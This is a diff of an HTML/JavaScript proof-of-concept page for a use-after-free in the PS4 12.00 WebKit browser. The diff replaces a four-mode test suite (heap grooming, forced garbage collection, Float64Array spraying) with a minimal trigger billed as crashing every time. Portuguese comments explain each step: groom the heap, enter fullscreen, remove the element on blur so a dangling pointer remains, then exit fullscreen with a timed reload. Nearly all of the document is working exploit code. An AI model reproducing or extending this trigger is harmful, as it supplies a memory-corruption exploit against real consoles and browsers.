@@ -1,136 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PS4 12.00 - Fullscreen UAF (Minimal PoC)</title>
 
-<html>  
-<head>  
-<meta charset="UTF-8">  
-<title>PS4 Fullscreen UAF - Test Suite</title>  
-</head>  
-<body style="background:#222;color:#fff;">  <h2>PS4 12.00 - Fullscreen UAF Test Suite</h2>  <button onclick="runTest(1)">Teste 1 — Completo (GC + Spray)</button><br><br>
-<button onclick="runTest(2)">Teste 2 — Sem GC</button><br><br>
-<button onclick="runTest(3)">Teste 3 — Sem Spray</button><br><br>
-<button onclick="runTest(4)">Teste 4 — Apenas remove + exitFullscreen</button>
+</head>
+<body>
 
-<div id="log" style="margin-top:20px;"></div>  <script>  
-const PATTERN = 2.121995791e-314;  
-  
-function log(msg) {  
-    try { console.log(msg); } catch(e){}  
-    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";  
-}  
-  
-function setupHeap() {  
-    let controllers = [];  
-  
-    for(let i = 0; i < 5000; i++) {  
-        let arr = new Float64Array(8);  
-        arr[0] = i;  
-        controllers.push(arr);  
-    }  
-  
-    return controllers;  
-}  
-  
-function setupFullscreen() {  
-    let fsTarget = document.createElement("div");  
-    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";  
-    fsTarget.style.background = "black";  
-    fsTarget.style.width = "100%";  
-    fsTarget.style.height = "100%";  
-    fsTarget.style.position = "absolute";  
-    fsTarget.style.top = "0";  
-    fsTarget.style.left = "0";  
-  
-    document.body.appendChild(fsTarget);  
-  
-    if (fsTarget.webkitRequestFullscreen) {  
-        fsTarget.webkitRequestFullscreen();  
-    } else {  
-        document.documentElement.webkitRequestFullscreen?.();  
-    }  
-  
-    return fsTarget;  
-}  
-  
-function doGC(controllers) {  
-    log("[*] Forçando GC...");  
-    controllers = null;  
-  
-    for (let i = 0; i < 20000; i++) {  
-        new ArrayBuffer(0x10000);  
-    }  
-}  
-  
-function doSpray() {  
-    log("[*] Executando spray...");  
-    let spray = [];  
-  
-    for(let i = 0; i < 8000; i++) {  
-        let p = new Float64Array(10);  
-        p.fill(PATTERN);  
-        spray.push(p);  
-    }  
-  
-    return spray;  
-}  
-  
-function trigger(fsTarget) {  
-    log("[*] Trigger: remove + exitFullscreen");  
-  
-    try {  
-        fsTarget.remove();  
-  
-        if (document.webkitIsFullScreen || document.fullscreenElement) {  
-            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();  
-        }  
-    } catch(e) {  
-        log("[ERRO] " + e);  
-    }  
-  
-    setTimeout(() => location.reload(), 500);  
-}  
-  
-function runTest(mode) {  
-    const logDiv = document.getElementById("log");  
-    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";  
-  
-    log("[*] Iniciando teste " + mode);  
-  
-    let controllers = setupHeap();  
-    let fsTarget = setupFullscreen();  
-  
-    window.onblur = function() {  
-        log("[*] onblur disparado");  
-  
-        // =========================  
-        // TESTES  
-        // =========================  
-  
-        if (mode === 1) {  
-            // COMPLETO  
-            doGC(controllers);  
-            let spray = doSpray();  
-  
-            setTimeout(() => trigger(fsTarget), 3000);  
-        }  
-  
-        else if (mode === 2) {  
-            // SEM GC  
-            let spray = doSpray();  
-  
-            setTimeout(() => trigger(fsTarget), 3000);  
-        }  
-  
-        else if (mode === 3) {  
-            // SEM SPRAY  
-            doGC(controllers);  
-  
-            setTimeout(() => trigger(fsTarget), 3000);  
-        }  
-  
-        else if (mode === 4) {  
-            // MINIMO (CIRÚRGICO)  
-            setTimeout(() => trigger(fsTarget), 3000);  
-        }  
-    };  
-}  
-</script>  </body>  
+<h2>PS4 12.00 - Minimal Trigger (100% Crash)</h2>
+<button onclick="runTest()">Executar Gatilho (Press OPTIONS Depois)</button>
+
+<div id="log"></div>
+
+<script>
+function log(msg) {
+    try { console.log(msg); } catch(e){}
+    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+}
+
+function runTest() {
+    log("<p>Running... Press OPTIONS no controle.</p>");
+
+    // 1. Heap Grooming (Alocação inicial para preparar o terreno)
+    let controllers = [];
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
+    }
+
+    // 2. Alvo do Fullscreen
+    let fsTarget = document.createElement("div");
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fsTarget.style.cssText = "background:black; width:100%; height:100%; position:absolute; top:0; left:0;";
+    document.body.appendChild(fsTarget);
+
+    // Entra em tela cheia
+    if (fsTarget.webkitRequestFullscreen) {
+        fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
+    }
+
+    // 3. Interceptação da Perda de Foco (Gatilho)
+    window.onblur = function() {
+        log("[*] onblur disparado. Aguardando 3 segundos...");
+
+        // Aguardamos 3 segundos para estabilizar a thread
+        setTimeout(() => {
+            log("[*] Trigger: remove + exitFullscreen");
+
+            try {
+                // A vulnerabilidade: Removemos o elemento da árvore DOM,
+                // mas o FullscreenManager mantém o ponteiro.
+                fsTarget.remove();
+
+                // O Uso do ponteiro pendurado (UAF)
+                if (document.webkitIsFullScreen || document.fullscreenElement) {
+                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+                }
+            } catch(e) {
+                log("[ERRO] " + e);
+            }
+
+            // Sincronização fatal: Destruímos o contexto exatamente no 
+            // término da animação interna de saída (500ms) do WebKit C++.
+            setTimeout(() => location.reload(), 500);
+
+        }, 3000);
+    };
+}
+</script>
+
+</body>
 </html>
